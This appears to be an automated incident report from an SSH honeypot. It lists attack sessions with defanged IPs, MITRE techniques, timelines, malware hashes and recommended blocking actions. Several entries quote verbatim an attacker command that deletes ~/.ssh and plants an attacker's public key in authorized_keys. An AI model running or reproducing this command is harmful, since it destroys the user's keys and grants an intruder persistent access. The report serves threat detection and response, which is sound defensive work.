| `2026-05-26 14:55:20` | `cowrie.command.failed` |
| `2026-05-26 14:55:20` | `cowrie.log.closed` |
| `2026-05-26 14:55:21` | `cowrie.session.params` |
| `2026-05-26 14:55:21` | `cowrie.command.input` |
| `2026-05-26 14:55:21` | `cowrie.session.file_download` |
| `2026-05-26 14:55:21` | `cowrie.log.closed` |
| `2026-05-26 14:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.186[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.186[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d74c0171293

| Field | Detail |
|---|---|
| **Source IP** | `183.91.186[.]36` |
| **First Seen** | 2026-05-26 14:55 |
| **Last Seen** | 2026-05-26 14:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:55:23` | `cowrie.session.connect` |
| `2026-05-26 14:55:23` | `cowrie.client.version` |
| `2026-05-26 14:55:23` | `cowrie.client.kex` |
| `2026-05-26 14:55:23` | `cowrie.login.success` |
| `2026-05-26 14:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.186[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.186[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e59b903f085d

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 14:57 |
| **Last Seen** | 2026-05-26 14:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:57:33` | `cowrie.session.connect` |
| `2026-05-26 14:57:33` | `cowrie.client.version` |
| `2026-05-26 14:57:33` | `cowrie.client.kex` |
| `2026-05-26 14:57:33` | `cowrie.login.success` |
| `2026-05-26 14:57:33` | `cowrie.session.params` |
| `2026-05-26 14:57:33` | `cowrie.command.input` |
| `2026-05-26 14:57:33` | `cowrie.command.failed` |
| `2026-05-26 14:57:33` | `cowrie.log.closed` |
| `2026-05-26 14:57:34` | `cowrie.session.params` |
| `2026-05-26 14:57:34` | `cowrie.command.input` |
| `2026-05-26 14:57:34` | `cowrie.session.file_download` |
| `2026-05-26 14:57:34` | `cowrie.log.closed` |
| `2026-05-26 14:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58e2f994ca09

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 14:57 |
| **Last Seen** | 2026-05-26 14:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:57:36` | `cowrie.session.connect` |
| `2026-05-26 14:57:36` | `cowrie.client.version` |
| `2026-05-26 14:57:36` | `cowrie.client.kex` |
| `2026-05-26 14:57:36` | `cowrie.login.success` |
| `2026-05-26 14:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08ded8bbec6e

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 14:58 |
| **Last Seen** | 2026-05-26 14:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:58:31` | `cowrie.session.connect` |
| `2026-05-26 14:58:31` | `cowrie.client.version` |
| `2026-05-26 14:58:31` | `cowrie.client.kex` |
| `2026-05-26 14:58:31` | `cowrie.login.success` |
| `2026-05-26 14:58:31` | `cowrie.session.params` |
| `2026-05-26 14:58:31` | `cowrie.command.input` |
| `2026-05-26 14:58:31` | `cowrie.command.failed` |
| `2026-05-26 14:58:32` | `cowrie.log.closed` |
| `2026-05-26 14:58:32` | `cowrie.session.params` |
| `2026-05-26 14:58:32` | `cowrie.command.input` |
| `2026-05-26 14:58:32` | `cowrie.session.file_download` |
| `2026-05-26 14:58:32` | `cowrie.log.closed` |
| `2026-05-26 14:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87564f3871bc

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 14:58 |
| **Last Seen** | 2026-05-26 14:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:58:34` | `cowrie.session.connect` |
| `2026-05-26 14:58:34` | `cowrie.client.version` |
| `2026-05-26 14:58:34` | `cowrie.client.kex` |
| `2026-05-26 14:58:34` | `cowrie.login.success` |
| `2026-05-26 14:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6127a431975e

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 14:59 |
| **Last Seen** | 2026-05-26 14:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:59:34` | `cowrie.session.connect` |
| `2026-05-26 14:59:34` | `cowrie.client.version` |
| `2026-05-26 14:59:34` | `cowrie.client.kex` |
| `2026-05-26 14:59:34` | `cowrie.login.success` |
| `2026-05-26 14:59:34` | `cowrie.session.params` |
| `2026-05-26 14:59:34` | `cowrie.command.input` |
| `2026-05-26 14:59:34` | `cowrie.command.failed` |
| `2026-05-26 14:59:34` | `cowrie.log.closed` |
| `2026-05-26 14:59:35` | `cowrie.session.params` |
| `2026-05-26 14:59:35` | `cowrie.command.input` |
| `2026-05-26 14:59:35` | `cowrie.session.file_download` |
| `2026-05-26 14:59:35` | `cowrie.log.closed` |
| `2026-05-26 14:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2586dd016a75

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 14:59 |
| **Last Seen** | 2026-05-26 14:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:59:37` | `cowrie.session.connect` |
| `2026-05-26 14:59:37` | `cowrie.client.version` |
| `2026-05-26 14:59:37` | `cowrie.client.kex` |
| `2026-05-26 14:59:37` | `cowrie.login.success` |
| `2026-05-26 14:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cade043f55a

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 15:02 |
| **Last Seen** | 2026-05-26 15:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 15:02:39` | `cowrie.session.connect` |
| `2026-05-26 15:02:39` | `cowrie.client.version` |
| `2026-05-26 15:02:39` | `cowrie.client.kex` |
| `2026-05-26 15:02:40` | `cowrie.login.success` |
| `2026-05-26 15:02:40` | `cowrie.session.params` |
| `2026-05-26 15:02:40` | `cowrie.command.input` |
| `2026-05-26 15:02:40` | `cowrie.command.failed` |
| `2026-05-26 15:02:40` | `cowrie.log.closed` |
| `2026-05-26 15:02:40` | `cowrie.session.params` |
| `2026-05-26 15:02:40` | `cowrie.command.input` |
| `2026-05-26 15:02:41` | `cowrie.session.file_download` |
| `2026-05-26 15:02:41` | `cowrie.log.closed` |
| `2026-05-26 15:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a0bf9fa12b0

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 15:02 |
| **Last Seen** | 2026-05-26 15:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 15:02:42` | `cowrie.session.connect` |
| `2026-05-26 15:02:42` | `cowrie.client.version` |
| `2026-05-26 15:02:42` | `cowrie.client.kex` |
| `2026-05-26 15:02:43` | `cowrie.login.success` |
| `2026-05-26 15:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee415f5f3075

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 15:06 |
| **Last Seen** | 2026-05-26 15:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 15:06:07` | `cowrie.session.connect` |
| `2026-05-26 15:06:07` | `cowrie.client.version` |
| `2026-05-26 15:06:07` | `cowrie.client.kex` |
| `2026-05-26 15:06:07` | `cowrie.login.success` |
| `2026-05-26 15:06:08` | `cowrie.session.params` |
| `2026-05-26 15:06:08` | `cowrie.command.input` |
| `2026-05-26 15:06:08` | `cowrie.command.failed` |
| `2026-05-26 15:06:08` | `cowrie.log.closed` |
| `2026-05-26 15:06:08` | `cowrie.session.params` |
| `2026-05-26 15:06:08` | `cowrie.command.input` |
| `2026-05-26 15:06:08` | `cowrie.session.file_download` |
| `2026-05-26 15:06:08` | `cowrie.log.closed` |
| `2026-05-26 15:06:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3640c645c93

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 15:06 |
| **Last Seen** | 2026-05-26 15:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 15:06:10` | `cowrie.session.connect` |
| `2026-05-26 15:06:10` | `cowrie.client.version` |
| `2026-05-26 15:06:10` | `cowrie.client.kex` |
| `2026-05-26 15:06:10` | `cowrie.login.success` |
| `2026-05-26 15:06:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a981aad1dcb1

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 15:08 |
| **Last Seen** | 2026-05-26 15:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 15:08:16` | `cowrie.session.connect` |
| `2026-05-26 15:08:16` | `cowrie.client.version` |
| `2026-05-26 15:08:17` | `cowrie.client.kex` |
| `2026-05-26 15:08:17` | `cowrie.login.success` |
| `2026-05-26 15:08:17` | `cowrie.session.params` |
| `2026-05-26 15:08:17` | `cowrie.command.input` |
| `2026-05-26 15:08:17` | `cowrie.command.failed` |
| `2026-05-26 15:08:17` | `cowrie.log.closed` |
| `2026-05-26 15:08:18` | `cowrie.session.params` |
| `2026-05-26 15:08:18` | `cowrie.command.input` |
| `2026-05-26 15:08:18` | `cowrie.session.file_download` |
| `2026-05-26 15:08:18` | `cowrie.log.closed` |
| `2026-05-26 15:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e50e560090fa

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 15:08 |
| **Last Seen** | 2026-05-26 15:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 15:08:20` | `cowrie.session.connect` |
| `2026-05-26 15:08:20` | `cowrie.client.version` |
| `2026-05-26 15:08:20` | `cowrie.client.kex` |
| `2026-05-26 15:08:20` | `cowrie.login.success` |
| `2026-05-26 15:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4b92fe8aefc

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 15:10 |
| **Last Seen** | 2026-05-26 15:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 15:10:30` | `cowrie.session.connect` |
| `2026-05-26 15:10:30` | `cowrie.client.version` |
| `2026-05-26 15:10:30` | `cowrie.client.kex` |
| `2026-05-26 15:10:30` | `cowrie.login.success` |
| `2026-05-26 15:10:31` | `cowrie.session.params` |
| `2026-05-26 15:10:31` | `cowrie.command.input` |
| `2026-05-26 15:10:31` | `cowrie.command.failed` |
| `2026-05-26 15:10:31` | `cowrie.log.closed` |
| `2026-05-26 15:10:31` | `cowrie.session.params` |
| `2026-05-26 15:10:31` | `cowrie.command.input` |
| `2026-05-26 15:10:31` | `cowrie.session.file_download` |
| `2026-05-26 15:10:31` | `cowrie.log.closed` |
| `2026-05-26 15:10:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cab9eb2beb6d

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 15:10 |
| **Last Seen** | 2026-05-26 15:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 15:10:33` | `cowrie.session.connect` |
| `2026-05-26 15:10:33` | `cowrie.client.version` |
| `2026-05-26 15:10:33` | `cowrie.client.kex` |
| `2026-05-26 15:10:34` | `cowrie.login.success` |
| `2026-05-26 15:10:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.135.41[.]74` | **25** | 2026-05-26 11:47 | 2026-05-26 11:52 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `223.123.43[.]5` | **25** | 2026-05-26 08:17 | 2026-05-26 08:23 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `8.210.75[.]243` | **22** | 2026-05-26 14:46 | 2026-05-26 14:55 | 42m | 0 | `T1592` | 🟠 MEDIUM |
| `101.79.165[.]133` | **20** | 2026-05-26 14:32 | 2026-05-26 15:10 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.145.238[.]60` | **20** | 2026-05-26 13:19 | 2026-05-26 13:44 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.80[.]70` | **20** | 2026-05-26 13:20 | 2026-05-26 13:32 | 1m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.222.230[.]188` | **20** | 2026-05-26 08:31 | 2026-05-26 08:54 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `179.33.210[.]213` | **16** | 2026-05-26 10:30 | 2026-05-26 10:51 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `212.70.108[.]151` | **16** | 2026-05-26 13:45 | 2026-05-26 13:59 | 32m | 0 | `T1592` | 🟠 MEDIUM |
| `34.142.110[.]144` | **16** | 2026-05-26 13:48 | 2026-05-26 14:00 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.39.234[.]65` | **15** | 2026-05-26 12:36 | 2026-05-26 12:50 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.68.83[.]105` | **15** | 2026-05-26 10:57 | 2026-05-26 11:19 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `149.12.245[.]83` | **14** | 2026-05-26 12:27 | 2026-05-26 12:46 | 28m | 0 | `T1592` | 🟠 MEDIUM |
| `14.103.126[.]104` | **11** | 2026-05-26 14:39 | 2026-05-26 14:54 | 2m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `3.142.134[.]216` | **4** | 2026-05-26 11:18 | 2026-05-26 11:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `116.110.12[.]29` | **3** | 2026-05-26 10:01 | 2026-05-26 10:02 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `116.110.6[.]117` | **3** | 2026-05-26 10:03 | 2026-05-26 10:05 | 4m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.131[.]77` | **3** | 2026-05-26 08:39 | 2026-05-26 09:02 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `3.21.171[.]90` | **3** | 2026-05-26 09:58 | 2026-05-26 09:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.105[.]250` | **2** | 2026-05-26 11:47 | 2026-05-26 11:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.83.167[.]33` | **2** | 2026-05-26 10:18 | 2026-05-26 10:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]141` | **2** | 2026-05-26 10:18 | 2026-05-26 10:18 | 0m | 0 | `T1592` | 🟢 LOW |
